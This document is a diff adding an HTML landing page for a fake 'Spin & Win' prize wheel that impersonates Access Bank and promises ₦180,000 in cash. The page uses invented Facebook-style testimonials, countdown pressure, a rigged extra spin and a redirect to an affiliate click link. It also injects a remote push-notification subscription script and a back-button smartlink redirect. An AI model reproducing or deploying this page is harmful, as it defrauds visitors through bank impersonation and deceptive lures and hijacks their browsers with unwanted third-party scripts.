@@ -1,0 +1,197 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <title>Congratulations</title>
+  <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="prizewheel-fb">
+<meta name="description" content="prizewheel-fb">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+   
+  <meta name="alert-message" content="We&#039;re sorry\n\nPlease try again. You have one more chance!">
+
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="landers/prizewheel-fb/assets/app.css" type="text/css" rel="stylesheet" />
+</head>
+
+<body >
+  <main id="app" v-cloak>
+    <div class="header">
+      SPIN &amp; WIN
+      <img class="header__icon" src="landers/prizewheel-fb/assets/img/notification.png" alt="" />
+    </div>
+    <div class="step" v-if="!hasWon">
+      <div class="card">
+        <div class="step__text">
+          <div class='step__date'>
+            {{ DateHelper().getMonthName() }}
+            {{ DateHelper().getDate() }},
+            {{ DateHelper().getYear() }}
+          </div>
+          <h1 class="step__title">
+            Congratulations Access Bank user, you have (1) reward pending!!
+          </h1>
+          <div class="step__subtitle">
+            Every <span class="strong">{{ DateHelper().getDayName() }}</span> we select 10 lucky users to receive a reward.
+          </div>
+        </div>
+        <div class="step__bar">
+          Claim Your Prize<br /><em>↓</em> Spin the wheel <em>↓</em>
+        </div>
+        <vue-prize-wheel ref="prizeWheel" class="prize-wheel" static-image="landers/prizewheel-fb/assets/img/prizewheel_static.png" prize-image="img/prizes/cash-500-usd/ng/default@0.5x.png" :start-at="startPrizewheelAt" v-on:lost="retryModalOpen = true" v-on:finish="hasWon = true">
+          <template v-slot:spinner>
+            <img src="landers/prizewheel-fb/assets/img/prizewheel_spinner.jpg" class="prize-wheel__wheel" alt="" />
+            <img src="img/prizes/cash-500-usd/ng/default@0.5x.png" class="prize-wheel__prize" alt="" />
+          </template>
+        </vue-prize-wheel>
+      </div>
+    </div>
+    <div class="step" v-if="hasWon && !isLoaded">
+      <div class="card step__loader">
+        <img src="landers/prizewheel-fb/assets/img/loader.gif" alt="Loading" />
+      </div>
+    </div>
+    <div class="step step--end" v-if="isLoaded">
+      <div class="card card--centered">
+        <div class="step__title step__title--bold">
+          Congratulations!
+          Just complete these steps to receive your ₦180,000.00 Cash!
+        </div>
+      </div>
+      <div class="card">
+        <div>
+          1. Click &#039;Claim Prize&#039; to claim your prize. You will be redirected to our partner&#039;s site.</div>
+        <div>
+          2. Follow the steps on the partner&#039;s site.
+        </div>
+        <div>
+          <span class="strong">IMPORTANT:</span>
+          Product may become unavailable at any time.
+        </div>
+        <div>Choose quickly!</div>
+      </div>
+      <div class="card">
+        The offer is valid for next <span><span v-html="countdownMinutes"></span> minutes and <span v-html="countdownSeconds"></span> seconds.</span>
+      </div>
+      <div class="card">
+        <div class="step__prize">
+          <div class="step__prize-image">
+            <img src="img/prizes/cash-500-usd/ng/default@0.5x.png" class="step__prize-image-image" alt="₦180,000.00 Cash" />
+            <div>(2) left</div>
+          </div>
+          <div class="step__prize-details">
+            <div class="step__title step__title--bold">₦180,000.00 Cash</div>
+            <div>Normal Price: ₦180,000.00</div>
+            <div>
+              Your Price:
+              <span class="new-prize">₦0.00</span>
+            </div>
+           <!-- <span class="step__button" v-on:click="offerUrl">Claim Prize</span>
+            -->
+            
+            <script>document.write('<a href="https://t2.surpriseanddelightgifts.com/click" class="step__button">Claim Prize</a>')</script>
+              
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="comments">
+      <div class="card">
+        <div class="comments__likes">
+          <span class="comments__link">12,068</span> total likes.
+        </div>
+        <vue-facebook-comment avatar="img/profiles/african/female/3@0.25x.jpg" name="Diana Aliyu" message="Initially I was not sure if this is real or not, but I have received the ₦180,000.00 Cash today :D!!" like-text="Like" reply-text="Reply" since-text="now" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/profiles/african/male/3@0.25x.jpg" name="Sam Usman" message="Did anybody win something in this sweepstakes??" like-text="Like" reply-text="Reply" since-text="9 minutes" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/profiles/african/male/10@0.25x.jpg" name="Emmanuel Ibrahim" message="How does it work? I won a Amazon card some years ago and all my attempts after - unsuccessful..." like-text="Like" reply-text="Reply" since-text="32 minutes" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/profiles/african/female/6@0.25x.jpg" name="Kebe Umar" message="Can you help me? I just won an gift card!! What should I do now?" :likes="12" like-text="Like" reply-text="Reply" since-text="55 minutes" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/profiles/african/male/9@0.25x.jpg" name="Michael Musa" message="₦180,000.00 Cash has come through the post today! Thanks to Access Bank !!." :likes="12" image="img/prizes/cash-500-usd/default/proof.jpg" like-text="Like" reply-text="Reply" since-text="1 hour" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/profiles/african/female/5@0.25x.jpg" name="Mary Adamu" message="Saw this one time offer and clicked it off because I thought it was fake. I saw the ad again and because I was bored so I decided to try it ... And I got a NEW iPhone X! What!!?!" like-text="Like" reply-text="Reply" since-text="3 hours" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/profiles/african/female/1@0.25x.jpg" name="Pollyanna Ibrahim" message="How does it work? I won a Amazon card some years ago and all my attempts after - unsuccessful..." :likes="21" like-text="Like" reply-text="Reply" since-text="3 hours" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment avatar="img/profiles/african/male/2@0.25x.jpg" name="Azeez Umar" message="I was not sure if it was true or not, but I received my card today!! 😍 amazing 🔥 🔥" :likes="1" like-text="Like" reply-text="Reply" since-text="6 hours" v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <p class="card__paragraph comments__link">
+          See 83 older comments
+        </p>
+      </div>
+      <div class="card">
+        <div class="comments__form">
+          <label for="reply">Add reply:</label>
+          <textarea rows="4" class="comments__form-input" ref="reply" id="reply"></textarea>
+          <p class="card__paragraph">
+            <button onclick="alert('Thank you for your comment, it will be published after being reviewed.');">
+              Submit
+            </button>
+          </p>
+        </div>
+      </div>
+    </div>
+    <vue-modal :open="welcomeModalOpen" class="modal" v-on:close="welcomeModalOpen = false">
+      <div class="modal__title" style="">₦180,000.00 Cash</div>
+      <img class="modal__image" src="img/prizes/cash-500-usd/ng/default@0.5x.png" alt="₦180,000.00 Cash" />
+      <p>
+        <span class="strong">
+          {{ DateHelper().getMonthName() }}
+          {{ DateHelper().getDate() }},
+          {{ DateHelper().getYear() }}
+        </span>
+        <br />
+        Congratulations Access Bank user!
+        <br />
+        National Consumer Center would like to thank you for your loyalty.
+        <br />
+      </p>
+      <p>
+        Spin the wheel to claim your special prize 🎁
+        <br>
+        <br>
+        <span class="strong">Good Luck!</span>
+      </p>
+      <button class="modal__button" v-on:click="startFirstSpin">OK</button>
+    </vue-modal>
+    <vue-modal :open="retryModalOpen" class="modal" v-on:close="retryModalOpen = false">
+      <div class="modal__title" style="">Try again!</div>
+      <p>
+        *** You&#039;ve won one extra spin ***
+      </p>
+      <button class="modal__button" v-on:click="startRetrySpin">OK</button>
+    </vue-modal>
+  </main>
+
+
+<script>window.view = window.view || {};view.datetimeTranslations = {"ago":":time ago","from_now":":time from now","after":":time after","before":":time before","year":"1 year|:count years","month":"1 month|:count months","week":"1 week|:count weeks","day":"1 day|:count days","hour":"1 hour|:count hours","minute":"1 minute|:count minutes","second":"1 second|:count seconds","january":"January","february":"February","march":"March","april":"April","may":"May","june":"June","july":"July","august":"August","september":"September","october":"October","november":"November","december":"December","monday":"Monday","tuesday":"Tuesday","wednesday":"Wednesday","thursday":"Thursday","friday":"Friday","saturday":"Saturday","sunday":"Sunday"};</script>
+
+
+
+<!--propush-->
+<script>
+    var s = document.createElement('script');
+    s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=5168327'+'&sw=/sw-check-permissions-ea2cf.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
+
+
+
+<script>
+  
+  var back = 'https://app.impih.com/?utm_medium=43f99f70b126f87db2fc1abfd2a6ee8b6d6ec8fc&utm_campaign=ng_smartlink&np=1';
+ 
+</script>
+<script src="script.js"></script>
+    
+    
+
+<script type="application/javascript" src="landers/prizewheel-fb/assets/app.js"></script>
+</body>
+</html>
